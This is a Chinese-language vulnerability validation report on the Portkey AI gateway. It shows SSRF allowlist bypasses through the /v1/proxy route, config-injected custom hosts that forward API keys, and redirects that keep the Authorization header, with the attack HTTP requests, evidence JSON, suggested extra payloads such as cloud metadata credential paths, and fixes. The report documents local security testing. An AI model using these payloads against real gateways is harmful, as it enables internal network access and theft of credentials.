# Portkey 本地攻击验证报告

测试日期：2026-09-14

测试目标：`@portkey-ai/gateway@1.15.2`

本次测试是在本机完成的隔离验证，没有使用真实 LLM API key，也没有访问外部云服务。测试脚本会临时启动两个本地进程：

- Portkey Gateway：`127.0.0.1:8787`
- 模拟上游服务 mock upstream：`127.0.0.1:18080`

复现命令：

```powershell
node .\reproduction\attack-portkey-local.mjs
```

脚本会把 Portkey 的 `TRUSTED_CUSTOM_HOSTS` 收紧为 `allowed.example.com`。这样做的目的是构造一个清晰的对照：正常路由应该拒绝访问本机、内网、metadata 这类不可信 custom host；如果 `/v1/proxy/*` 仍然能访问本地 mock，就说明它绕过了同一套 custom host 校验。

判断漏洞是否成立时，不只看 Portkey 返回码。proxy 测试里 Portkey 最后可能返回 `500`，但只要 mock upstream 已经收到请求，就说明 SSRF 请求已经发出；如果 mock 同时收到 `Authorization`，就说明凭据也被转发到了攻击者控制的上游。

## 策略 1：通过 `/v1/proxy/*` 绕过 custom-host SSRF allowlist

攻击思路：

Portkey 普通 OpenAI 兼容路由会对 `x-portkey-custom-host` 做校验；但公开报道的风险点在于 `/v1/proxy/*` 没有挂同样的 `requestValidator`。这里用 `http://2130706433:18080` 作为 loopback 的另一种写法，测试 proxy 路由是否仍能访问本机 mock。

攻击请求：

```http
POST /v1/proxy/v1/chat/completions
x-portkey-provider: openai
x-portkey-custom-host: http://2130706433:18080
authorization: Bearer sk-local-client-forwarded
```

对照请求：

```http
POST /v1/chat/completions
x-portkey-provider: openai
x-portkey-custom-host: http://2130706433:18080
```

实测结果：

- `/v1/chat/completions` returned `400 Invalid custom host`; mock upstream received `0` requests.
- `/v1/proxy/v1/chat/completions` reached the mock upstream at `/v1/chat/completions`; mock received `authorization: Bearer sk-local-client-forwarded`.

中文解读：

普通路由被拦住，说明当前 `TRUSTED_CUSTOM_HOSTS` 配置确实生效；proxy 路由却把同样的 custom host 发出去了，说明绕过点成立。mock 里看到的 `authorization: Bearer sk-local-client-forwarded` 表示客户端传进 Portkey 的认证头被带到了攻击者控制的上游。

影响：

`/v1/proxy/*` does not apply the same custom-host validator as the normal OpenAI-compatible route. In a deployment where `TRUSTED_CUSTOM_HOSTS` is supposed to block local/internal targets, this path still allowed a client-supplied alternate loopback host representation to be fetched.

## 策略 2：通过 `x-portkey-config` 注入 custom host 并转发 provider key

攻击思路：

除了直接传 `x-portkey-custom-host`，Portkey 也支持通过 `x-portkey-config` 传入 provider、api_key、custom_host 等配置。普通路由会解析并校验这个 JSON；如果 proxy 路由跳过校验，攻击者就可以把一个不可信 custom host 和一枚 provider key 组合在同一个 config 里。

攻击请求：

```http
POST /v1/proxy/v1/chat/completions
x-portkey-config: {"provider":"openai","api_key":"sk-local-config-forwarded","custom_host":"http://2130706433:18080"}
```

对照请求：

```http
POST /v1/chat/completions
x-portkey-config: {"provider":"openai","api_key":"sk-local-config-forwarded","custom_host":"http://2130706433:18080"}
```

实测结果：

- `/v1/chat/completions` returned `400 Invalid config passed`, with `Invalid custom host`; mock upstream received `0` requests.
- `/v1/proxy/v1/chat/completions` reached the mock upstream; mock received `authorization: Bearer sk-local-config-forwarded`.

中文解读：

同一个 `x-portkey-config` 在普通路由被拒绝，在 proxy 路由被接受。更关键的是，config 里的 `api_key` 被 Portkey 转换成了发往上游的 `Authorization` 头，mock 实际收到了 `Bearer sk-local-config-forwarded`。这就是“SSRF + 凭据转发”的组合风险。

影响：

The proxy route accepted a config value that the normal route rejected. The provider key from the config was then converted into an outbound `Authorization` header and sent to the attacker-controlled custom host.

## 策略 3：proxy 目标选择后的重定向与 Authorization 行为

攻击思路：

很多 SSRF 防护只在第一次选择目标 URL 时做检查，但没有限制后续 HTTP redirect。本地 mock 先返回一个 `302`，把请求跳到 `http://2130706433:18080/redirected-from-allowed-host`，观察 Portkey 是否会跟随跳转。由于十进制 loopback 会被 WHATWG URL 规范化为同一回环地址，本用例属于同源跳转；它可以证明可达目标空间扩大和同源 Authorization 保留，不能直接证明跨源 Authorization 也会保留。

攻击请求：

```http
POST /v1/proxy/redirect-to-alt
x-portkey-provider: openai
x-portkey-custom-host: http://127.0.0.1:18080
authorization: Bearer sk-local-client-forwarded
```

实测结果：

- Mock upstream received the initial `POST /redirect-to-alt`.
- It returned a `302 Location: http://2130706433:18080/redirected-from-allowed-host`.
- Mock upstream then received the redirected `GET /redirected-from-allowed-host` with the same `authorization: Bearer sk-local-client-forwarded`; this is the same-origin normalized loopback case.

中文解读：

mock 收到了两次请求：第一次是 Portkey 访问原始 proxy 目标，第二次是 Portkey 跟随 mock 返回的 `302` 后访问跳转目标。第二次请求仍然带着 `authorization: Bearer sk-local-client-forwarded`，但该目标与初始目标属于同源规范化后的回环地址。这个结果说明跳转可以扩大目标空间；跨源跳转的 Authorization 行为必须使用独立目标单独验证。

影响：

Once the proxy path initiates the fetch, redirects are followed and the authorization header is preserved across the same-origin local redirect in this test. That widens the practical SSRF surface if an allowed or reachable host can redirect to a sensitive target; cross-origin header behavior is a separate test condition.

## 本地证据

最新结果文件：

```text
../evidence/portkey-attack-1789372807806.json
```

最新运行的关键证据：

```json
[
  {
    "name": "normal_route_rejects_alt_loopback_custom_host",
    "gatewayStatus": 400,
    "mockRequestCount": 0
  },
  {
    "name": "proxy_route_reaches_alt_loopback_custom_host",
    "gatewayStatus": 500,
    "mockRequestCount": 1,
    "firstMockUrl": "/v1/chat/completions",
    "firstMockAuthorization": "Bearer sk-local-client-forwarded"
  },
  {
    "name": "normal_route_rejects_config_custom_host",
    "gatewayStatus": 400,
    "mockRequestCount": 0
  },
  {
    "name": "proxy_route_uses_config_custom_host_and_key",
    "gatewayStatus": 500,
    "mockRequestCount": 1,
    "firstMockUrl": "/v1/chat/completions",
    "firstMockAuthorization": "Bearer sk-local-config-forwarded"
  },
  {
    "name": "proxy_redirect_preserves_authorization_after_follow",
    "gatewayStatus": 500,
    "mockRequestCount": 2,
    "firstMockUrl": "/redirect-to-alt",
    "firstMockAuthorization": "Bearer sk-local-client-forwarded"
  }
]
```

这里有个容易误判的点：proxy 测试里的 `gatewayStatus` 是 `500`，但这不是“攻击失败”。从 Gateway 日志看，`500` 发生在 Portkey 已经完成 outbound fetch 之后的响应处理阶段；mock request log 已经记录到请求和认证头，所以 SSRF 与凭据转发的核心证据成立。

## 复现与扩展建议

如果你想继续扩展这个本地攻击面，可以优先加下面几类 payload：

- 更多 loopback 表达：`http://0x7f000001:18080`、`http://127.1:18080`、IPv6 mapped IPv4。
- metadata 目标模拟：把 mock 改成返回类似云 metadata 的路径，例如 `/latest/meta-data/iam/security-credentials/`。
- header 泄漏测试：增加 `cookie`、`x-api-key`、`openai-organization`、自定义业务 header，观察 proxy 路由会转发哪些头。
- HTTP 方法覆盖：把 `/v1/proxy/*` 的 `GET`、`DELETE`、multipart/form-data、audio content-type 分别测一遍。
- redirect 边界：测试跨 host、跨 scheme、相对跳转、多段跳转时 Authorization 是否保留。

修复方向也比较直接：让 `/v1/proxy/*` 进入和普通 `/v1/*` 一样的请求校验链；对 `custom_host` 做统一 canonicalization 和 DNS/IP 私网判断；fetch 时禁止或重新校验 redirect；默认不要把客户端敏感头透传给自定义上游。
